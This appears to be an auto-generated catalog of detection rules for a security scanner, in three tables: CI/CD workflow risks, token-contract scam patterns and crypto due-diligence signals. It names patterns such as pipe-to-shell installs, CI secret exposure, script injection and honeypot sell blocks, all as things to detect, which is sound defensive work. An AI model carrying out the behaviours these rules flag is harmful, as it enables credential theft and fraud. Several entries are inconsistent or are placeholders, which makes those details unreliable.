| `C01` | CI_SCRIPT_INJECTION | critical | 96 | CI script injection — event payload concatenated into shell command | `ci script injection` | GitHub event payload injection into shell — critical CI/CD attack vector. _Impact:_ CI credential theft, artifact poisoning. |
| `C02` | CI_SECRET_IN_SCRIPT | critical | 94 | CI script exposes secrets — secrets accessible in shell execution | `ci secret in script` | See code comments for detailed rationale. |
| `C03` | CI_PIPED_INSTALL | critical | 95 | Pipe-to-shell in CI — arbitrary remote code execution | `ci piped install` | See code comments for detailed rationale. |
| `C04` | CI_WRITE_ALL_PERMS | high | 85 | Write-all permissions grant excessive access to repository | `ci write all perms` | See code comments for detailed rationale. |
| `C05` | CI_WRITE_PERMISSIONS_CONTENTS | high | 82 | Contents write permission on default — allows malicious commit push | `ci write permissions contents` | See code comments for detailed rationale. |
| `C06` | CI_PERMISSIONS_MISSING | medium | 72 | No explicit permissions block — defaults may be too broad | `ci permissions missing` | See code comments for detailed rationale. |
| `C07` | CI_ACTIONS_BRANCH_MAIN | high | 85 | Action pinned to mutable branch — supply chain risk from branch force-push | `ci actions branch main` | See code comments for detailed rationale. |
| `C08` | CI_ACTIONS_UNPINNED | medium | 68 | Action not pinned to hash or semver — supply chain risk | `ci actions unpinned` | See code comments for detailed rationale. |
| `C09` | CI_ACTIONS_SELF_HOSTED | medium | 62 | Self-hosted runner — security responsibility on your infrastructure | `ci actions self hosted` | See code comments for detailed rationale. |
| `C10` | CI_CREDENTIAL_CHECKOUT | critical | 92 | Git checkout with persist-credentials=true — token accessible to post-job scripts | `ci credential checkout` | See code comments for detailed rationale. |
| `C11` | CI_TOKEN_ENVIRONMENT | high | 88 | Token exposed as environment variable — accessible to all steps | `ci token environment` | See code comments for detailed rationale. |
| `C12` | CI_SHALLOW_CHECKOUT | low | 40 | Shallow checkout (fetch-depth: 0) fetches full history — may be unnecessary | `ci shallow checkout` | See code comments for detailed rationale. |
| `C13` | CI_REF_CHECKOUT | high | 78 | PR checkout with user-controlled ref — possible code injection | `ci ref checkout` | See code comments for detailed rationale. |
| `C14` | CI_ENVIRONMENT_PROD | medium | 66 | Deploy to production environment without review — bypasses change control | `ci environment prod` | See code comments for detailed rationale. |
| `C15` | CI_DEBUG_ENABLED | medium | 65 | Debug mode enabled — secrets may be exposed in runner logs | `ci debug enabled` | See code comments for detailed rationale. |
| `C16` | CI_CHECKOUT_ALL_HISTORY | low | 35 | Full git history checkout — reduces efficiency, increases attack surface | `ci checkout all history` | See code comments for detailed rationale. |
| `C17` | CI_MATRIX_INJECTION | high | 88 | Matrix variable sourced from event payload — injection via matrix param | `ci matrix injection` | See code comments for detailed rationale. |
| `C18` | CI_SELF_HOSTED_UNRESTRICTED | medium | 74 | Self-hosted runner without label restriction — any workflow uses it | `ci self hosted unrestricted` | See code comments for detailed rationale. |
| `C19` | CI_UPLOAD_ARTIFACT_SENSITIVE | high | 86 | Sensitive file uploaded as artifact — credential exposure risk | `ci upload artifact sensitive` | See code comments for detailed rationale. |
| `C20` | CI_ARTIFACT_RETENTION | medium | 60 | Long artifact retention period — increased exposure window | `ci artifact retention` | See code comments for detailed rationale. |
| `C21` | CI_OIDC_DISABLED | high | 80 | OIDC not configured for cloud access — long-lived credentials instead | `ci oidc disabled` | See code comments for detailed rationale. |
| `C22` | CI_IF_CONDITION_INJECTION | high | 88 | Condition based on event payload — injection via crafted event data | `ci if condition injection` | See code comments for detailed rationale. |
| `C23` | CI_GIT_CONFIG_EXPOSURE | medium | 64 | Git config changes in CI — identity spoofing in commits | `ci git config exposure` | See code comments for detailed rationale. |

## Token Intelligence Engine (`tokenIntel`)

| ID | Name | Severity | Score | Description | Example Trigger | Score Rationale |
|----|------|----------|-------|-------------|-----------------|-----------------|
| `T01` | UNLIMITED_MINT | critical | 98 | Unlimited mint — supply can be inflated to zero value | `unlimited mint` | Public unlimited mint function — most common token scam pattern. _Impact:_ Infinite mint, token price collapse. |
| `T02` | SUPPLY_MANIPULATION | critical | 95 | Total supply directly manipulated — bypasses mint/burn accounting | `supply manipulation` | See code comments for detailed rationale. |
| `T03` | SUPPLY_CAP | high | 82 | No supply cap — token can be minted indefinitely | `supply cap` | See code comments for detailed rationale. |
| `T04` | RENOUNCE_OWNERSHIP | critical | 94 | Ownership renounced to zero address — no contract admin possible | `renounce ownership` | See code comments for detailed rationale. |
| `T05` | OWNERSHIP_TRANSFER | high | 85 | Ownership transferrable without two-factor or timelock — single-key risk | `ownership transfer` | See code comments for detailed rationale. |
| `T06` | MULTI_OWNER_MISSING | medium | 72 | Single owner — single point of failure, no multisig fallback | `multi owner missing` | See code comments for detailed rationale. |
| `T07` | LIQUIDITY_LOCK_ABSENT | high | 88 | Liquidity not locked — rug pull: LP tokens can be withdrawn anytime | `liquidity lock absent` | See code comments for detailed rationale. |
| `T08` | LIQUIDITY_REMOVAL | critical | 96 | Immediate liquidity removal without delay — rug pull vector | `liquidity removal` | Liquidity removal after trading makes token unsellable. _Impact:_ Complete loss of liquidity, token becomes worthless. |
| `T09` | HONEYPOT_SELL_RESTRICTED | critical | 97 | Sell function restricted — honeypot: users can buy but not sell | `honeypot sell restricted` | See code comments for detailed rationale. |
| `T10` | HONEYPOT_FEE_STRUCTURE | high | 86 | Excessive sell fee — honeypot pattern: buy is cheap, sell is prohibitively expensive | `honeypot fee structure` | See code comments for detailed rationale. |
| `T11` | TAX_MANIPULATION | high | 84 | Tax rate adjustable by anyone — can set to 100% and trap funds | `tax manipulation` | See code comments for detailed rationale. |
| `T12` | TAX_CHANGE_DELAY | medium | 70 | Tax can be changed instantly — no user notice period | `tax change delay` | See code comments for detailed rationale. |
| `T13` | OWNER_CONCENTRATION | high | 83 | Owner controls majority supply — price manipulation risk | `owner concentration` | See code comments for detailed rationale. |
| `T14` | CONCENTRATED_HOLDING | medium | 74 | Team holds large allocation — potential for coordinated dump | `concentrated holding` | See code comments for detailed rationale. |
| `T15` | PROXY_UPGRADE_UNRESTRICTED | critical | 95 | Proxy upgrade unrestricted — contract can be replaced with malicious logic | `proxy upgrade unrestricted` | See code comments for detailed rationale. |
| `T16` | PROXY_ADMIN_CHANGE | high | 88 | Proxy admin transferrable without restriction — proxy can be hijacked | `proxy admin change` | See code comments for detailed rationale. |
| `T17` | BLACKLIST_MANIPULATION | high | 85 | Broad blacklist power — can freeze all holders and centralize control | `blacklist manipulation` | See code comments for detailed rationale. |
| `T18` | BLACKLIST_ADD_UNRESTRICTED | high | 82 | Anyone can add to blacklist — griefing attack vector | `blacklist add unrestricted` | See code comments for detailed rationale. |
| `T19` | REFLECTION_MANIPULATION | high | 80 | Reward calculation can be manipulated — team can exclude from redistribution | `reflection manipulation` | See code comments for detailed rationale. |
| `T20` | REFLECTION_EXCLUSION | medium | 74 | Owner excluded from reflection — skewed reward distribution | `reflection exclusion` | See code comments for detailed rationale. |
| `T21` | PAUSE_UNRESTRICTED | high | 86 | Pause/unpause unrestricted — trade can be frozen arbitrarily | `pause unrestricted` | See code comments for detailed rationale. |
| `T22` | SWAP_MIN_OUTPUT | high | 88 | Minimum output set to zero — MEV sandwich attack: receive nothing | `swap min output` | See code comments for detailed rationale. |
| `T23` | SWAP_DEADLINE_MISSING | medium | 72 | Deadline missing — stale swap execution at unfavorable price | `swap deadline missing` | See code comments for detailed rationale. |
| `T24` | UNVERIFIED_FACTORY | high | 78 | Unverified factory address — fake pair with malicious token | `unverified factory` | See code comments for detailed rationale. |
| `T25` | FALSE_PAIR | medium | 76 | Anyone can create trading pair — counterfeit token pairs possible | `false pair` | See code comments for detailed rationale. |

## Due Diligence Engine (`dueDiligence`)

| ID | Name | Severity | Score | Description | Example Trigger | Score Rationale |
|----|------|----------|-------|-------------|-----------------|-----------------|
| `DD01` | ANONYMOUS_TEAM | critical | 94 | Anonymous team — no accountability, high rug pull risk | `anonymous team` | Anonymous team prevents accountability or legal recourse. _Impact:_ No legal recourse, high scam probability. |
| `DD02` | SINGLE_SIG_OWNER | high | 88 | Single signer ownership — single point of compromise, no recovery path | `single sig owner` | See code comments for detailed rationale. |
| `DD03` | UNRESTRICTED_UPGRADE | critical | 96 | Upgradeable contract with single-key upgrade — rug pull vector | `unrestricted upgrade` | See code comments for detailed rationale. |
| `DD04` | UNLOCKED_LIQUIDITY | critical | 95 | Liquidity not locked or lock expired — immediate rug pull possible | `unlocked liquidity` | See code comments for detailed rationale. |
| `DD05` | LP_TOKEN_BURN_ABSENT | high | 86 | LP tokens not burned or locked — creator can drain liquidity | `lp token burn absent` | See code comments for detailed rationale. |
| `DD06` | LIQUIDITY_TIMELOCK | high | 84 | Liquidity lock duration too short — rug pull after lock expires | `liquidity timelock` | See code comments for detailed rationale. |
| `DD07` | UNLIMITED_MINT_AUTHORITY | critical | 97 | Unrestricted mint authority held by single account — infinite inflation | `unlimited mint authority` | Unlimited mint authority allows infinite token supply. _Impact:_ Infinite dilution, token value collapse. |
| `DD08` | OWNER_SUPPLY_CONCENTRATION | high | 88 | Owner holds majority supply — price manipulation on any sell | `owner supply concentration` | See code comments for detailed rationale. |
| `DD09` | HONEYPOT_SELL_BLOCK | critical | 98 | Sell blocked for non-owners — honeypot: users cannot exit positions | `honeypot sell block` | See code comments for detailed rationale. |
| `DD10` | HONEYPOT_MAX_SELL | high | 86 | Maximum sell amount extremely small — honeypot: users cannot exit | `honeypot max sell` | See code comments for detailed rationale. |
| `DD11` | SELL_TAX_HIGH | high | 85 | Sell tax significantly higher than buy tax — honeypot pattern | `sell tax high` | See code comments for detailed rationale. |
| `DD12` | NO_KYC_TEAM | high | 85 | No KYC-verified team — no legal accountability | `no kyc team` | See code comments for detailed rationale. |
| `DD13` | NO_AUDIT | high | 85 | No security audit — undiscovered vulnerabilities likely | `no audit` | See code comments for detailed rationale. |
| `DD14` | AUDIT_FABRICATED | critical | 93 | Fabricated audit report — false security assurance | `audit fabricated` | See code comments for detailed rationale. |
| `DD15` | UNFAIR_ALLOCATION | high | 85 | Unfair allocation — team/insiders hold excessive supply | `unfair allocation` | See code comments for detailed rationale. |
| `DD16` | NO_VESTING_TEAM | high | 85 | Team tokens without vesting — immediate dump possible on TGE | `no vesting team` | See code comments for detailed rationale. |
| `DD17` | SHORT_VESTING | medium | 72 | Short vesting period — team can dump quickly after TGE | `short vesting` | See code comments for detailed rationale. |
| `DD18` | TRADING_PAUSE_UNRESTRICTED | high | 87 | Trading can be paused by anyone — market manipulation risk | `trading pause unrestricted` | See code comments for detailed rationale. |
| `DD19` | BLACKLIST_ALL | critical | 92 | Mass blacklist capability — all holders can be frozen instantly | `blacklist all` | See code comments for detailed rationale. |
| `DD20` | MAX_WALLET | medium | 70 | Maximum wallet limit extremely low — restricts normal trading | `max wallet` | See code comments for detailed rationale. |
| `DD21` | LOW_SOCIAL_ENGAGEMENT | medium | 64 | Low social engagement — potential lack of community support | `low social engagement` | See code comments for detailed rationale. |
| `DD22` | NO_WHITEPAPER | medium | 66 | No whitepaper or documentation — lack of project substance | `no whitepaper` | See code comments for detailed rationale. |
| `DD23` | PAST_RUG_CHECK | high | 89 | Team associated with past rug pull or scam project | `past rug check` | See code comments for detailed rationale. |
| `DD24` | CLONED_PROJECT | high | 87 | Cloned/forked project without meaningful changes — copycat risk | `cloned project` | See code comments for detailed rationale. |
| `DD25` | IMPERSONATION | critical | 96 | Impersonation of known project or brand — likely scam | `impersonation` | See code comments for detailed rationale. |

---
*Catalog auto-generated from source definitions. Run `node scripts/generate-catalog.js` to regenerate.*
